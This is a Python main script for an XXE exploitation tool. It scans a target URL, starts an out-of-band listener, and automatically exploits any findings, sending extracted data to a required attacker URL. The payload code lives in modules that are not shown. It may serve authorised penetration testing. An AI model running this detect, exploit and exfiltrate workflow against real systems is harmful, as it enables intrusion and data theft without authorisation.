import argparse
import time
import pyfiglet
from colorama import Fore, init
from core.xxeDetect import XXEDetector
from core.xxe import OutOfBandListener
import threading

init(autoreset=True)

def print_banner():
    banner_text = "XXE_Master"
    font_style = "slant"
    banner = pyfiglet.figlet_format(banner_text, font=font_style)
    print(Fore.YELLOW + banner)
    print(f"{Fore.YELLOW}***************************************************************")
    print()

def print_author_info():
    author_info = 'Author: El1E-l33t | Contact: muhizielie01@gmail.com | Description: Red Teamer, Penetration tester, and bug bounty hunter with a passion for security research.'
    print(Fore.GREEN + author_info)
    print()

def main():
    print_banner()
    print_author_info()

    parser = argparse.ArgumentParser(description='XXE Vulnerability Detection and Exploitation Tool')
    parser.add_argument('url', type=str, help='Target URL for XXE scanning')
    parser.add_argument('--attacker-url', '-Aurl', required=True, help='Attacker URL for data exfiltration')
    parser.add_argument('--delay', '-d', type=int, default=2, help='Delay between outputs in seconds')
    parser.add_argument('--listen-host', '-lhost', default='0.0.0.0', help='Host to listen on for out-of-band data')
    parser.add_argument('--listen-port', '-lport', type=int, default=8000, help='Port to listen on for out-of-band data')
    args = parser.parse_args()

    listener = OutOfBandListener(args.listen_host, args.listen_port)
    listener_thread = threading.Thread(target=listener.start_listener)
    listener_thread.start()

    detector = XXEDetector(args.url)
    vulnerabilities = detector.detect_xxe_vulnerabilities(args.attacker_url)

    for vuln in vulnerabilities:
        print(Fore.RED + vuln)
        time.sleep(args.delay)

    if vulnerabilities:
        print(Fore.YELLOW + "Exploiting detected vulnerabilities...")
        detector.exploit_detected_vulnerabilities()

    listener_thread.join()

if __name__ == '__main__':
    main()
